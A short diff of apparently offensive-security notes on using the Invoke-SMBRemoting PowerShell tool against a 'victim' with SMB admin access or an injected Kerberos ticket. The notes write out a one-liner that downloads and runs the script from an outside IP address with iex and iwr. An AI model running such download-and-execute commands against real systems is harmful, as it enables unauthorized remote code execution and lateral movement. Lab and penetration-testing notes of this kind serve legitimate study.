@@ -1,5 +1,6 @@
 # Powershell Implementation
 *NOTE: We need admin access to SMB on the victim, can be abused using also injected kerberos ticket!*
+
 Source: https://github.com/Leo4j/Invoke-SMBRemoting
 
 - Invoke the script: `iex(iwr http://192.168.45.223/Invoke-SMBRemoting -UseBasicParsing)`
